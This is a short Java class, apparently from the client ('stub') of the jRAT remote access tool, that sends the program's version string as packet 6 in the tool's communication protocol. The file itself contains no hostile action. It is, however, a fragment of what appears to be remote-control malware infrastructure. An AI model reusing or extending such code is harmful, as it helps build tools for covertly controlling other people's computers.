package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.Version;
import se.jrat.common.io.StringWriter;


public class Packet6InitVersion extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(Version.getVersion());
	}

	@Override
	public byte getPacketId() {
		return (byte) 6;
	}

}
